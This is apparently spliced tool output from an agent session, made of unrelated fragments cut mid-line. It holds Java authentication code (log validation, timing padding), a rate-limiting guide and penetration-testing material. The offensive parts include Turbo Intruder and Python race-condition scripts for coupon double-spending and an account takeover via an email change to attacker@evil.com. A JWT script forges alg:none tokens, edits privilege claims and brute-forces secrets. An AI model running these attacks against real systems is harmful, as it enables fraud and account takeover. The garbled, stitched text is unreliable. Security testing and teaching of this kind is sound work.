{\n    93\t        return retryAfterSeconds >= 0 && retryAfterSeconds <= 86_400 ? retryAfterSeconds : 0;\n    94\t    }\n    95\t\n    96\t    /**\n    97\t     * Renders the canonical single-line form. sequence) {\n   101\t        StringBuilder out = new StringBuilder(192);\n   102\t        out.append(\"seq=\").append(sequence)\n   103\t                .append(\" ts=\").append(TIMESTAMP.format(java.time.Instant.ofEpochMilli(timestampMillis)))\n   104\t                .append(\" type=\").append(type.token())\n   105\t                .append(\"        }\n   110\t        if (reason != null) {\n   111\t            out.append(\" reason=\").append(reason);\n   112\t        }\n   113\t        out.append(\" latency_us=\").append(latencyMicros);\n       out.append(\" session=\").append(sessionSuffix);\n   119\t        }\n   120\t        return out.toString();\n   121\t    }\n   122\t\n   123\t    /**\n   124\t     * Returns the rendered line, InputValidator#normalizeSourceAddress}.\n   127\t     */\n   128\t    String renderOrReject(long sequence) {\n   129\t        if (type == null || outcome == null) {\n   130\t            return null;\n   131\t        }\n   132\t        if (accountField == null || !accountField.startsWith(\"account_id=\")) {\n   133\t            return null;\n   134\t        }\n   135\t        if (source != null && !SOURCE_PATTERN.matcher(source).matches()) {\n   136\t            return null;\n   137\t        }\n   138\t        if (source != null && !source.equals(InputValidator.normalizeSourceAddress(source))) {\n   139\t            return null;\n   140\t        }\n   141\t        if (sessionSuffixRejected) {\n   142\t            // The caller attached a session identifier this component cannot vouch for. Dropping the\n   143\t            // field and writing the line would record a success whose evidence was thrown away, so\n   144\t            // the whole event is refused and the caller raises an alert instead.\n   145\t            return null;\n   146\t        }\n   147\t        if (sessionSuffix != null && !sessionSuffix.matches(\"[0-9a-f]{6}\")) {\n   148\t            return null;\n   149\t        }\n   150\t        if (latencyMicros < 0 || latencyMicros > 3_600_000_000L) {\n   151\t            return null;\n   152\t        }\n   153\t        if (retryAfterSeconds < 0 || retryAfterSeconds > 86_400) {\n   154\t            return null;\n   155\t        }\n   156\t        if (sequence < 1) {\n   157\t            return null;\n   158\t        }\n   159\t        String line = render(sequence);\n   160\t        if (line.length() > MAX_LINE_CHARS || line.indexOf('\\n') >= 0 || line.indexOf('\\r') >= 0) {\n   161\t            return null;\n   162\t        }\n   163\t        for (int i = 0; i < line.length(); i++) {\n   164\t            char c = line.charAt(i);\n   165\t            // Space (0x20) is the field separator and must be allowed; every other character below\n   166\t            // it (tab, NUL, CR, LF, the rest of C0) and DEL are refused, which is what stops a\n   167\t            // forged second record or a terminal escape sequence.\n   168\t            if (c < 0x20 || c == 0x7f) {\n   169\t                return null;\n   170\t            }\n   171\t        }\n   172\t        return line;\n   173\t    }\n   174\t\n   175\t    @Override\n   176\t    public String toString() {\n   177\t        // Sequence 0 is never a valid number, so this can only ever render the redacted shape and\n   178\t        // never a line that would otherwise be rejected.\n   179\t        return \"AuthEvent[type=\" + (type == null ? \"none\" : type.token()) + \"]\";\n   180\t    }\n   181\t\n   182\t    static final class Builder {\n   183\t\n   184\t        private long timestampMillis;\n   185\t        private EventType type;\n   186\t        private String outcome = \"none\";\n   187\t        private String accountField;\n   188\t        private String source;\n   189\t        private String reason;\n   190\t        private long latencyMicros;\n   191\t        private int retryAfterSeconds;\n   192\t        private String sessionSuffix;\n   193\t        private boolean sessionSuffixRejected;\n   194\t\n   195\t        private Builder() {\n   196\t        }\n   197\t\n   198\t        Builder timestampMillis(long value) {\n   199\t            this.timestampMillis = value;\n   200\t            return this;\n   201\t        }\n   202\t\n   203\t        Builder type(EventType value) {\n   204\t            this.type = value;\n   205\t            return this;\n   206\t        }\n   207\t\n   208\t        Builder outcome(String value) {\n   209\t            if (!\"success\".equals(value) && !\"failure\".equals(value) && !\"none\".equals(value)\n   210\t                    && !\"blocked\".equals(value) && !\"error\".equals(value)) {\n   211\t                throw new IllegalArgumentException(\"outcome\");\n   212\t            }\n   213\t            this.outcome = value;\n   214\t            return this;\n   215\t        }\n   216\t\n   217\t        Builder account(String submittedUsername, boolean present) {\n   218\t            this.accountField = AccountField.render(submittedUsername, present);\n   219\t            return this;\n   220\t        }\n   221\t\n   222\t        /**\n   223\t         * Reuses an account field the component already computed, for re-reporting a rejected event\n   224\t         * as an alert. What it does not\n     8\t * equalise is everything around the derivation: a throttle hit returns in microseconds, a\n     9\t * verification returns in a couple of hundred milliseconds. A caller who can measure the response can\n    10\t * therefore still learn which branch ran. This class closes that gap by holding every outcome until\n    11\t * a common floor has elapsed.\n    12\t *\n    13\t * <p><b>Sizing.</b> The floor is not a guess: it is derived from a measurement of a real derivation\n    14\t * on this machine ({@link PasswordHasher#measureDerivationNanos(int)}) plus a margin, and it is\n    15\t * clamped to {@link #MAX_FLOOR_MICROS} so a pathological measurement cannot make the service\n    16\t * unusably slow. The floor is a wall-clock target measured with {@link System#nanoTime()}.\n    17\t *\n    18\t * <p><b>Fail-open in the safe direction.</b> If the elapsed time already exceeds the floor, nothing\n    19\t * happens: a slow machine is not made slower. Padding is therefore never a correctness dependency,\n    20\t * only a leak-reduction measure - which is why the README lists timing as a residual risk rather than\n    21\t * claiming the side channel is closed. Park-and-hold is capped at {@link #MAX_SLEEP_MILLIS} per call\n    22\t * and never used to extend a refusal.\n    23\t *\n    24\t * <p><b>Not a throttle.</b> This never holds a request past the floor and never accumulates debt, so\n    25\t * it cannot be turned into a denial of service by driving up the measured cost.\n    26\t */\n    27\tfinal class LatencyBudget {\n    28\t\n    29\t    /** Ceiling on the floor, so a bad measurement cannot make sign-in take minutes. */\n    30\t    static final long MAX_FLOOR_MICROS = 4_000_000L;\n    31\t\n    32\t    /** Floor used when measurement is impossible; sized for the configured iteration floor. */\n    33\t    static final long FALLBACK_FLOOR_MICROS = 250_000L;\n    34\t\n    35\t    /** Margin added to the measured derivation cost. */\n    36\t    static final double MARGIN = 1.35D;\n    37\t\n    38\t    private static final long MAX_SLEEP_MILLIS = 50L;\n    39\t\n    40\t    private final long floorNanos;\n    41\t    private this.measuredDerivationMicros = measuredDerivationMicros;\n    46\t    }\n    47\t\n    48\t    /**\n    49\t     * Measures the derivation cost and derives the floor.\n    50\t     *\n    51\t     * @param iterations the configured work factor, so the floor tracks the real cost rather than a\n    52\t     *     hard-coded number\n    53\t     * @return a budget whose floor is {@code measured * MARGIN}, clamped into\n    54\t     *     [{@value #FALLBACK_FLOOR_MICROS} us, {@value #MAX_FLOOR_MICROS} us]\n    55\t     */\n    56\t    static LatencyBudget measure(PasswordHasher hasher, int iterations) {\n    57\t        long nanos = hasher.measureDerivationNanos(iterations, \"latency-probe-value\".getBytes(java.nio.charset.StandardCharsets.UTF_8));\n    58\t        long micros = nanos < 0 ? -1L : Math.max(1L, nanos / 1000L);\n    59\t        long floor;\n    60\t        if (micros <= 0) {\n    61\t            floor = FALLBACK_FLOOR_MICROS;\n    62\t        } else {\n    63\t            double withMargin = micros * MARGIN;\n    64\t            if (withMargin > MAX_FLOOR_MICROS) {\n    65\t                floor = MAX_FLOOR_MICROS;\n    66\t            } else if (withMargin < FALLBACK_FLOOR_MICROS) {\n    67\t                floor = FALLBACK_FLOOR_MICROS;\n    68\t            } else {\n    69\t                floor = (long) withMargin;\n    70\t            }\n    71\t        }\n    72\t        return new LatencyBudget(floor * 1000L, Math.max(0L, micros));\n    73\t    }\n    74\t\n    75\t    /** Fixed floor, used by tests that need a deterministic budget. */\n    76\t    static LatencyBudget fixedMicros(long floorMicros) {\n    77\t        long clamped = Math.min(Math.max(floorMicros, 1L), MAX_FLOOR_MICROS);\n    78\t        return new LatencyBudget(clamped * 1000L, 0L);\n    79\t    }\n    80\t\n    81\t    /**\n    82\t     * Blocks until {@code started} plus the floor has elapsed, then returns.\n    83\t     *\n    84\t     * @param started value of {@link System#nanoTime()} at the beginning of the attempt\n    85\t     */\n    86\t    void padUntil(long started) {\n    87\t        long remaining = floorNanos - (System.nanoTime() - started);\n    88\t        while (remaining > 0) {\n    89\t            long sleepMillis = remaining / 1_000_000L;\n    90\t            if (sleepMillis > MAX_SLEEP_MILLIS) {\n    91\t                sleepMillis = MAX_SLEEP_MILLIS;\n    92\t            }\n    93\t            if (sleepMillis <= 0) {\n    94\t                // Sub-millisecond remainder: spin rather than overshoot with a 1 ms sleep.\n    95\t                Thread.onSpinWait();\n    96\t            } else {\n    97\t                try {\n    98\t                    Thread.sleep(sleepMillis);\n    99\t                } catch (InterruptedException e) {\n   100\t                    Thread.currentThread().interrupt();\n   101\t                    return;\n   102\t                }\n   103\t            }\n   104\t            remaining = floorNanos - (System.nanoTime() - started);\n   105\t        }\n   106\t    }\n   107\t\n   108\t    long floorMicros() {\n   109\t        return floorNanos / 1000L;\n   110\t    }\n   111\t\n   112\t    long measuredDerivationMicros() {\n   113\t        return measuredDerivationMicros;\n   114\t    }\n   115\t\n   116\t    @Override\n   117\t    public String toString() {\n   118\t        return \"LatencyBudget[floorMicros=\" + floorMicros() + \", measuredDerivationMicros=\" + measuredDerivationMicros + \"]\";\n   119\t    }\n   120\t}\n     1\tpackage com.example.auth;\n Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.\n\n## Workflow\n\n### Step 1 — Identify Race Condition Attack Surface\n```\n# Common race condition targets:\n# - Coupon/discount code redemption (limit: 1 per user)\n# - Account balance transfers\n# - Inventory purchase (limited stock)\n# - Rate-limited operations (login attempts, SMS verification)\n# - Multi-step workflows (email change + password reset)\n# - File upload + processing pipelines\n\n# Capture the target request in Burp Suite\n# Send to Turbo Intruder (Extensions > Turbo Intruder > Send to Turbo Intruder)\n```\n\n### Step 2 — Configure Single-Packet Attack in Turbo Intruder\n```python\n# Turbo Intruder script for single-packet race condition\n# This sends all requests simultaneously in one TCP packet\n\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                          concurrentConnections=1,\n                          engine=Engine.BURP2)\n\n    # Queue 20 identical requests for the same operation\n    for i in range(20):\n        engine.queue(target.req, gate='race1')\n\n    # Hold all requests until ready\n    engine.openGate('race1')\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\n### Step 3 — Execute Limit Overrun Attack\n```python\n# Turbo Intruder script for coupon/discount limit bypass\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                          concurrentConnections=1,\n                          requestsPerConnection=50,\n                          engine=Engine.BURP2)\n\n    # Send 50 coupon redemption requests simultaneously\n    for i in range(50):\n        engine.queue(target.req, gate='coupon_race')\n\n    engine.openGate('coupon_race')\n\ndef handleResponse(req, interesting):\n    # Flag successful redemptions (200 OK)\n    if req.status == 200:\n        table.add(req)\n```\n\n### Step 4 — Exploit Multi-Endpoint Race Conditions\n```python\n# Race condition between two different endpoints\n# Example: Change email + trigger password reset simultaneously\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                          concurrentConnections=1,\n                          engine=Engine.BURP2)\n\n    # Request 1: Change email to attacker@evil.com\n    email_change = '''POST /api/change-email HTTP/2\nHost: target.com\nCookie: session=VALID_SESSION\nContent-Type: application/json\n\n{\"email\":\"attacker@evil.com\"}'''\n\n    # Request 2: Trigger password reset (goes to original email)\n    password_reset = '''POST /api/reset-password HTTP/2\nHost: target.com\nContent-Type: application/json\n\n{\"email\":\"victim@target.com\"}'''\n\n    engine.queue(email_change, gate='race1')\n    engine.queue(password_reset, gate='race1')\n\n    engine.openGate('race1')\n\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\n### Step 5 — Test with Python Threading Alternative\n```python\nimport threading\nimport requests\n\nTARGET_URL = \"http://target.com/api/redeem-coupon\"\nCOUPON_CODE = \"DISCOUNT50\"\nSESSION_COOKIE = \"session=abc123\"\n\ndef send_request():\n    response = requests.post(\n        TARGET_URL,\n        json={\"coupon\": COUPON_CODE},\n        headers={\"Cookie\": SESSION_COOKIE},\n        timeout=10\n    )\n    print(f\"Status: {response.status_code}, Response: {response.text[:100]}\")\n\n# Create barrier to synchronize thread start\nbarrier = threading.Barrier(20)\n\ndef synchronized_request():\n    barrier.wait()  # All threads wait here, then start together\n    send_request()\n\nthreads = [threading.Thread(target=synchronized_request) for _ in range(20)]\nfor t in threads:\n    t.start()\nfor t in threads:\n    t.join()\n```\n\n### Step 6 — Analyze Results and Confirm Exploitation\n```\n# In Turbo Intruder results:\n# - Sort by status code to identify successful requests\n# - Compare response lengths to find anomalies\n# - Check if more than one request succeeded (limit overrun confirmed)\n# - Verify backend state (balance, inventory, coupon count)\n\n# Document the race window timing\n# Successful race conditions typically require:\n# - HTTP/2 single-packet attack: ~30 seconds to find\n# - Last-byte sync (HTTP/1.1): ~2+ hours to find\n# - Thread-based approach: Variable, less reliable\n```\n\n## Key Concepts\n\n| Concept | Description |\n|---------|-------------|\n| TOCTOU | Time-of-Check-to-Time-of-Use flaw where state changes between validation and action |\n| Single-Packet Attack | Sending multiple HTTP/2 requests in one TCP packet for precise synchronization |\n| Last-Byte Sync | HTTP/1.1 technique holding final byte of multiple requests then releasing simultaneously |\n| Limit Overrun | Exceeding one-time-use limits by exploiting race windows in validation logic |\n| Hidden State Machine | Exploiting transitional states in multi-step application workflows |\n| Gate Mechanism | Turbo Intruder feature that holds requests until all are queued, then releases simultaneously |\n| Connection Warming | Pre-establishing connections to reduce network jitter in race condition attacks |\n\n## Tools & Systems\n\n| Tool | Purpose |\n|------|---------|\n| Turbo Intruder | Burp Suite extension for high-speed race condition exploitation |\n| Burp Suite Repeater | Group send feature for basic race condition testing |\n| Nuclei | Template-based scanner with race condition detection templates |\n| Python threading | Custom multi-threaded race condition scripts |\n| racepwn | Dedicated race condition testing framework |\n| asyncio/aiohttp | Python async HTTP for concurrent request sending |\n\n## Common Scenarios\n\n1. **Coupon Double-Spend** — Redeem a single-use coupon multiple times by sending concurrent redemption requests before the server marks it as used\n2. **Balance Overdraft** — Transfer more money than available by sending simultaneous transfer requests that each pass the balance check\n3. **MFA Bypass** — Submit multiple MFA codes simultaneously to bypass rate limiting on verification attempts\n4. **Inventory Manipulation** — Purchase more items than available stock by exploiting race conditions in inventory decrement logic\n5. **Account Registration Bypass** — Create multiple accounts with the same email by submitting concurrent registration requests\n\n## Output Format\n\n```\n## Race Condition Assessment Report\n- **Target**: http://target.com/api/redeem-coupon\n- **Technique**: HTTP/2 Single-Packet Attack via Turbo Intruder\n- **Concurrent 1 | POST /redeem-coupon | Single use coupon | 1 redemption | 4 redemptions | High |\n| 2 | POST /transfer | Balance transfer | Limited by balance | Overdraft achieved | Critical |\n\n### Race Window Analysis\n- HTTP/2 single-packet: Reliable exploitation in <30 seconds\n- Success rate: ~20% per batch of 20 requests\n- Race window estimated: 50-100ms\n\n### Remediation\n- Implement database-level locking (SELECT FOR UPDATE) on critical operations\n- Use optimistic concurrency control with version numbers\n- Apply idempotency keys for state-changing requests\n- Implement distributed locks for multi-server environments\n```\n","exit_code":0,"status":"completed"}}

Combine with authentication, authorization, and WAF rules.\n\n## Prerequisites\n\n- Redis 6.0+ for distributed rate limit counters (or in-memory for single-instance deployments)\n- API framework (Express.js, FastAPI, Spring Boot, or Django REST Framework)\n- Monitoring system for rate limit metrics (Prometheus, CloudWatch, Datadog)\n- Understanding of the API's normal traffic patterns and peak usage\n- Load testing tool (k6, Gatling, or Locust) for validating rate limit behavior\n\n## Workflow\n\n### Step 1: Rate Limiting Strategy Design\n\nDefine rate limits per endpoint category and user tier:\n\n```python\n# Rate limit configuration\nRATE_LIMITS = {\n    # Standard API endpoints\n    \"api\": {\n        \"free\": {\"requests\": 60, \"window_seconds\": 60, \"by\": \"user\"},\n        \"premium\": {\"requests\": 300, \"window_seconds\": 60, \"by\": \"user\"},\n        \"enterprise\": {\"requests\": 1000, \"window_seconds\": 60, \"by\": \"user\"},\n    },\n    # Resource-intensive endpoints\n    \"expensive\": {\n        \"search\": {\"requests\": 10, \"window_seconds\": 60, \"by\": \"user\"},\n        \"export\": {\"requests\": 5, \"window_seconds\": 3600, \"by\": \"user\"},\n        \"bulk_import\": {\"requests\": 2, \"window_seconds\": 3600, \"by\": \"user\"},\n    },\n    # Global limits\n    \"global\": {\n        \"per_ip\": {\"requests\": 1000, \"window_seconds\": 60, \"by\": \"ip\"},\n        \"per_user\": {\"requests\": 5000, \"window_seconds\": 3600, \"by\": \"user\"},\n    },\n}\n```\n\n### Step 2: Sliding Window Rate Limiter (Redis)\n\n```python\nimport redis\nimport time\nimport hashlib\nfrom functools import wraps\nfrom flask import Flask, request, jsonify, g\n\napp = Flask(__name__)\nredis_client = redis.Redis(host='localhost', port=6379, db=0, decode_responses=True)\n\nclass SlidingWindowRateLimiter:\n    \"\"\"Sliding window rate limiter using Redis sorted sets.\"\"\"\n\n    def __init__(self, redis_conn):\n        self.redis = redis_conn\n\n    def is_allowed(self, key, max_requests, window_seconds):\n        \"\"\"Check if request is allowed and record it.\"\"\"\n        now = time.time()\n        window_start = now - window_seconds\n        pipe = self.redis.pipeline()\n\n        # Remove expired entries\n        pipe.zremrangebyscore(key, 0, window_start)\n        # Count requests in current window\n        pipe.zcard(key)\n        # Add current request\n        pipe.zadd(key, {f\"{now}:{hashlib.md5(str(now).encode()).hexdigest()[:8]}\": now})\n        # Set TTL on the key\n        pipe.expire(key, window_seconds + 1)\n\n        results = pipe.execute()\n        current_count = results[1]\n\n        if current_count >= max_requests:\n            # Calculate retry-after\n            oldest = self.redis.zrange(key, 0, 0, withscores=True)\n            if oldest:\n                retry_after = int(oldest[0][1] + window_seconds - now) + 1\n            else:\n                retry_after = window_seconds\n            return False, current_count, max_requests, retry_after\n\n        return True, current_count + 1, max_requests, 0\n\nrate_limiter = SlidingWindowRateLimiter(redis_client)\n\ndef rate_limit(max_requests, window_seconds, key_func=None):\n    \"\"\"Decorator for rate limiting API endpoints.\"\"\"\n    def decorator(f):\n        @wraps(f)\n        def wrapped(*args, **kwargs):\n            # Determine the rate limit key\n            if key_func:\n                identifier = key_func()\n            elif hasattr(g, 'user_id'):\n                identifier = f\"user:{g.user_id}\"\n            else:\n                identifier = f\"ip:{request.remote_addr}\"\n\n            key = f\"ratelimit:{request.endpoint}:{identifier}\"\n            allowed, current, limit, retry_after = rate_limiter.is_allowed(\n                key, max_requests, window_seconds)\n\n            # Always set rate limit headers\n            headers = {\n                \"X-RateLimit-Limit\": str(limit),\n                \"X-RateLimit-Remaining\": str(max(0, limit - current)),\n                \"X-RateLimit-Reset\": str(int(time.time()) + window_seconds),\n            }\n\n            if not allowed:\n                headers[\"Retry-After\"] = str(retry_after)\n                response = jsonify({\n                    \"error\": \"rate_limit_exceeded\",\n                    \"message\": \"Too many requests. Please try again later.\",\n                    \"retry_after\": retry_after\n                })\n                response.status_code = 429\n                for h, v in headers.items():\n                    response.headers[h] = v\n                return response\n\n            response = f(*args, **kwargs)\n            for h, v in headers.items():\n                response.headers[h] = v\n            return response\n        return wrapped\n    return decorator\n\n# Apply rate limiting to endpoints\n@app.route('/api/v1/auth/login', methods=['POST'])\n@rate_limit(max_requests=5, window_seconds=60,\n            key_func=lambda: f\"ip:{request.remote_addr}\")\ndef login():\n    # Login logic\n    return jsonify({\"message\": \"Login successful\"})\n\n@app.route('/api/v1/users/me', methods=['GET'])\n@rate_limit(max_requests=60, window_seconds=60)\ndef get_profile():\n    # Profile logic\n    return jsonify({\"user\": \"data\"})\n\n@app.route('/api/v1/search', methods=['GET'])\n@rate_limit(max_requests=10, window_seconds=60)\ndef search():\n    # Search logic\n    return jsonify({\"results\": []})\n```\n\n### Step 3: Token Bucket Rate Limiter\n\n```python\nimport redis\nimport time\n\nclass TokenBucketRateLimiter:\n    \"\"\"Token bucket rate limiter allowing burst traffic within limits.\"\"\"\n\n    def __init__(self, redis_conn):\n        self.redis = redis_conn\n\n    def is_allowed(self, key, max_tokens, refill_rate, refill_interval=1):\n        \"\"\"\n        Token bucket algorithm:\n        - max_tokens: Maximum burst capacity\n        - refill_rate: Tokens added per refill_interval\n        - refill_interval: Seconds between refills\n        \"\"\"\n        now = time.time()\n        bucket_key = f\"tb:{key}\"\n\n        # Lua script for atomic token bucket operation\n        lua_script = \"\"\"\n        local key = KEYS[1]\n        local max_tokens = tonumber(ARGV[1])\n        local refill_rate = tonumber(ARGV[2])\n        local refill_interval = tonumber(ARGV[3])\n        local now = tonumber(ARGV[4])\n\n        local bucket = redis.call('hmget', key, 'tokens', 'last_refill')\n        local tokens = tonumber(bucket[1])\n        local last_refill = tonumber(bucket[2])\n\n        if tokens == nil then\n            tokens = max_tokens\n            last_refill = now\n        end\n\n        -- Refill tokens\n        local elapsed = now - last_refill\n        local refills = math.floor(elapsed / refill_interval)\n        if refills > 0 then\n            tokens = math.min(max_tokens, tokens + (refills * refill_rate))\n            last_refill = last_refill + (refills * refill_interval)\n        end\n\n        local allowed = 0\n        if tokens >= 1 then\n            tokens = tokens - 1\n            allowed = 1\n        end\n\n        redis.call('hmset', key, 'tokens', tokens, 'last_refill', last_refill)\n        redis.call('expire', key, math.ceil(max_tokens / refill_rate * refill_interval) + 10)\n\n        return {allowed, tokens, max_tokens}\n        \"\"\"\n\n        result = self.redis.eval(lua_script, 1, bucket_key,\n                                  max_tokens, refill_rate, refill_interval, now)\n        allowed = bool(result[0])\n        remaining = int(result[1])\n        limit = int(result[2])\n\n        return allowed, remaining, limit\n```\n\n### Step 4: Tiered Rate Limiting with User Plans\n\n```python\nfrom enum import Enum\n\nclass UserTier(Enum):\n    FREE = \"free\"\n    PREMIUM = \"premium\"\n    ENTERPRISE = \"enterprise\"\n\nTIER_LIMITS = {\n    UserTier.FREE: {\n        \"default\": (60, 60),          # 60 req/min\n        \"search\": (10, 60),           # 10 req/min\n        \"export\": (5, 3600),          # 5 req/hour\n        \"daily_total\": (1000, 86400), # 1000 req/day\n    },\n    UserTier.PREMIUM: {\n        \"default\": (300, 60),\n        \"search\": (50, 60),\n        \"export\": (20, 3600),\n        \"daily_total\": (10000, 86400),\n    },\n    UserTier.ENTERPRISE: {\n        \"default\": (1000, 60),\n        \"search\": (200, 60),\n        \"export\": (100, 3600),\n        \"daily_total\": (100000, 86400),\n    },\n}\n\ndef get_rate_limit_for_request(user_tier, endpoint_category=\"default\"):\n    \"\"\"Get rate limit configuration based on user tier and endpoint.\"\"\"\n    tier_config = TIER_LIMITS.get(user_tier, TIER_LIMITS[UserTier.FREE])\n    limit_config = tier_config.get(endpoint_category, tier_config[\"default\"])\n    return limit_config  # (max_requests, window_seconds)\n\nclass TieredRateLimitMiddleware:\n    \"\"\"Middleware that applies rate limits based on user subscription tier.\"\"\"\n\n    def __init__(self, app, redis_conn):\n        self.app = app\n        self.limiter = SlidingWindowRateLimiter(redis_conn)\n\n    def __call__(self, environ, start_response):\n        # Extract user info from request\n        user_id = environ.get(\"HTTP_X_USER_ID\")\n        user_tier = UserTier(environ.get(\"HTTP_X_USER_TIER\", \"free\"))\n        endpoint = environ.get(\"PATH_INFO\", \"/\")\n\n        # Determine endpoint category\n        category = \"default\"\n        if \"/search\" in endpoint:\n            category = \"search\"\n        elif \"/export\" in endpoint:\n            category = \"export\"\n\n        max_requests, window = get_rate_limit_for_request(user_tier, category)\n        key = f\"tiered:{user_id or environ.get('REMOTE_ADDR')}:{category}\"\n\n        allowed, current, limit, retry_after = self.limiter.is_allowed(\n            key, max_requests, window)\n\n        if not allowed:\n            status = \"429 Too Many Requests\"\n            headers = [\n                (\"Content-Type\", \"application/json\"),\n                (\"Retry-After\", str(retry_after)),\n                (\"X-RateLimit-Limit\", str(limit)),\n                (\"X-RateLimit-Remaining\", \"0\"),\n            ]\n            start_response(status, headers)\n            body = f'{{\"error\":\"rate_limit_exceeded\",\"retry_after\":{retry_after},\"tier\":\"{user_tier.value}\"}}'\n            return [body.encode()]\n\n        return self.app(environ, start_response)\n```\n\n### Step 5: Distributed Rate Limiting for Microservices\n\n```python\n# Centralized rate limiting service using Redis Cluster\nimport redis\nfrom redis.cluster import RedisCluster\n\nclass DistributedRateLimiter:\n    \"\"\"Rate limiter for microservice architectures using Redis Cluster.\"\"\"\n\n    def __init__(self):\n        self.redis = RedisCluster(\n            startup_nodes=[\n","exit_code":0,"status":"completed"}}

int(result[2]),\n        }\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Sliding Window** | Rate limiting algorithm that tracks requests in a rolling time window, providing smoother rate enforcement than fixed windows |\n| **Token Bucket** | Algorithm where tokens are added at a fixed rate and consumed per request, allowing controlled bursts up to the bucket capacity |\n| **Fixed Window** | Simplest rate limiting where requests are counted per fixed time window (e.g., per minute), susceptible to burst at window boundaries |\n| **429 Too Many Requests** | HTTP status code indicating the client has exceeded the rate limit, accompanied by Retry-After header |\n| **Retry-After Header** | HTTP response header telling the client how many seconds to wait before retrying, essential for well-behaved API clients |\n| **Distributed Rate Limiting** | Rate limiting across multiple server instances using shared state (Redis, Memcached) to maintain accurate global counters |\n\n## Tools & Systems\n\n- **Redis**: In-memory data store used for distributed rate limit counters with atomic operations via Lua scripts\n- **Kong Rate Limiting Plugin**: API gateway plugin supporting fixed-window and sliding-window rate limiting with Redis backend\n- **express-rate-limit**: Express.js middleware for simple rate limiting with Redis, Memcached, or in-memory stores\n- **Flask-Limiter**: Flask extension for rate limiting with support for multiple backends and configurable limits per endpoint\n- **Envoy Rate Limit Service**: Centralized rate limiting service for Envoy-based service mesh architectures\n\n## Common Scenarios\n\n### Scenario: Implementing Rate Limiting for a Public API\n\n**Context**: A company launches a public API with free, premium, and enterprise tiers. The API must protect against abuse while providing fair access to paying customers. The API runs on 6 instances behind an AWS ALB.\n\n**Approach**:\n1. Deploy Redis Cluster (3 nodes) for distributed rate limit state\n2. Implement sliding window rate limiter using Redis sorted sets with Lua scripts for atomicity\n3. Configure per-tier limits: Free (60 req/min), Premium (300 req/min), Enterprise (1000 req/min)\n4. Add stricter limits on authentication endpoints (5 req/min per IP) regardless of tier\n5. Implement resource-intensive endpoint limits (search: 10 req/min free, export: 5 req/hour)\n6. Set rate limit response headers on every response (X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset)\n7. Return 429 with Retry-After header and JSON error body when limits are exceeded\n8. Set up Prometheus metrics for rate limit hits and CloudWatch alarms for unusual patterns\n\n**Pitfalls**:\n- Using in-memory rate limiting without shared state across instances, allowing limit bypass by hitting different servers\n- Not implementing rate limiting on authentication endpoints separately from general API limits\n- Using fixed windows that allow burst at window boundaries (2x the limit in a short period)\n- Not including rate limit headers on successful responses, giving clients no visibility into their quota\n- Trusting X-Forwarded-For for IP identification without validating it against the load balancer\n\n## Output Format\n\n```\n## Rate Limiting Implementation Report\n\n**API**: Public API v2\n**Algorithm**: Sliding Window (Redis Sorted Sets)\n**Backend**: Redis Cluster (3 nodes)\n**Deployment**: 6 API instances behind AWS ALB\n\n### Rate Limit Configuration\n\n| Tier | Default | Search | Export | Auth (per IP) |\n|------|---------|--------|--------|---------------|\n| Free | 60/min | 10/min | 5/hour | 5/min |\n| Premium | 300/min | 50/min | 20/hour | 5/min |\n| Enterprise | 1000/min | 200/min | 100/hour | 10/min |\n\n### Validation Results (k6 load test)\n\n- Free tier: Rate limited at 61st request (correct)\n- Premium tier: Rate limited at 301st request (correct)\n- Cross-instance: Rate limiting consistent across all 6 instances\n- Redis failover: Rate limiting degrades gracefully (allows traffic) when Redis is unreachable\n- Retry-After header: Accurate within 1 second of actual reset time\n- Response overhead: < 2ms added latency per request for rate limit check\n```\n","exit_code":0,"status":"completed"}}

secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old 